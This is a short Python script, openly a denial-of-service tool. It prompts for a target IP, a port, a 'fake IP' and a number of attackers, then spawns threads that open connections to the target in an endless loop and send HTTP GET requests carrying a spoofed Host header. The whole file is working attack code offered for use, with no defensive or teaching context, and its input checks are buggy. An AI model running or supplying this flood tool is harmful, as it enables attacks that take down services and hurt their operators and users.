import threading
import socket


def attack(target, port, fake_ip):
    while True:
        this_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        this_socket.connect((target, port))
        this_socket.sendto(f'GET /{target} HTTP/1.1\r\n'.encode('ascii'), (target, port))
        this_socket.sendto(f'Host: {fake_ip}\r\n\r\n'.encode('ascii'), (target, port))
        this_socket.close()


def ddos_attack(number_of_attackers, target, port, fake_ip):
    for _ in range(number_of_attackers):
        thread = threading.Thread(target=attack, args=(target, port, fake_ip))
        thread.start()


def get_ip(input_text):
    while True:
        ip_address = input(input_text).strip()
        split_target = ip_address.split('.')
        if len(split_target) != 4:
            print('Entered IP address is not valid.')
            continue
        for number in split_target:
            try:
                _ = int(number)
            except:
                print('Entered IP address is not valid.')
                continue
        return ip_address


def get_integer(input_text):
    while True:
        port = input(input_text)
        try:
            port = int(port)
        except:
            print('Port number is not valid.')
        return port


def main():
    target = get_ip('Enter the target IP address: ')
    port = get_integer('Enter the port number: ')
    fake_ip = get_ip('Enter the fake IP address: ')
    attackers = get_integer('Enter the number of attackers: ')
    ddos_attack(attackers, target, port, fake_ip)


if __name__ == '__main__':
    main()
